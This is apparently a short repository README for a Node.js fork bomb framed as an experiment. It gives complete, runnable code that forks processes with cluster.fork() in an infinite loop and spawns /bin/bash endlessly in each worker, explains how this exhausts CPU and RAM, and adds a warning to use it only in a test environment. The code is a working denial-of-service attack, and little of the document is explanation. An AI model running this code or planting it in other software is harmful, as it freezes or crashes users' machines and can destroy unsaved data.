# Nodejs_ForkBomb
This experiment mimics the behavior of a fork bomb by utilizing  `cluster.fork()`  and  `spawn()`  simultaneously. 

### Main Code
```js
const { spawn } = require("child_process");
const cluster = require("cluster");

function loop() {
  while (true) {
    spawn("/bin/bash", ["-i"], { shell: true });
  }
}

if (cluster.isMaster) {
  while (true) {
    cluster.fork();
  }
} else loop();

```

### Description
This script is a combination of two techniques:
- `cluster.fork()` to clone the Node.js process. 
- `spawn()` to execute an external progjam (in this case `/bin/bash` ) from each child process.

Both are executed inside an infinite loop `(while (true))`, creating a process explosion effect that causes CPU and RAM to drastically increase. The end result is a simulated fork bomb, where the system runs out of resources and stops responding.

### ⚠️ Warning

> DO NOT run this script on the main system, main Termux, or devices with important data.<br>
> This experiment can:
> - Causes RAM Full.
> - Causes 100% CPU usage.
> - Makes Termux/Android/Linux unresponsive.
> - Forces the system to reboot.

Use only in a secure test environment.
